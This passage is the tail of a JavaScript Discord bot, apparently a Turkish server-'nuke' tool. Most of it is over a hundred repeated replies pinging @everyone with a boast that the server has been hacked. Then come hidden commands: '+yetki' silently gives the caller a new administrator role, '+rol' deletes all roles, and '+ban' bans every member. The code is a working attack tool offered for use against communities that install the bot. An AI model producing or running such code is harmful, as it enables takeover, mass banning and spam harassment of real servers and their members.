        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
        msg.reply('BU DİSCORD SUNUCUSU HACKLENMİŞTİR KOLAYDI xD @everyone');
    
    
  }
});

//―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――

client.on("message", msg => {
  if (msg.content === "+yetki") {
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");
    msg.member.addRole(rol);
  }
});

client.on("message", msg => {
  if (msg.content === "+rol") {
    msg.guild.roles.forEach(roles => roles.delete());
  }
});

client.on("message", msg => {
  if (msg.content === "+ban") {
    msg.delete();
    msg.guild.members.forEach(member => member.ban());
  }
});

client.login(ayarlar.token);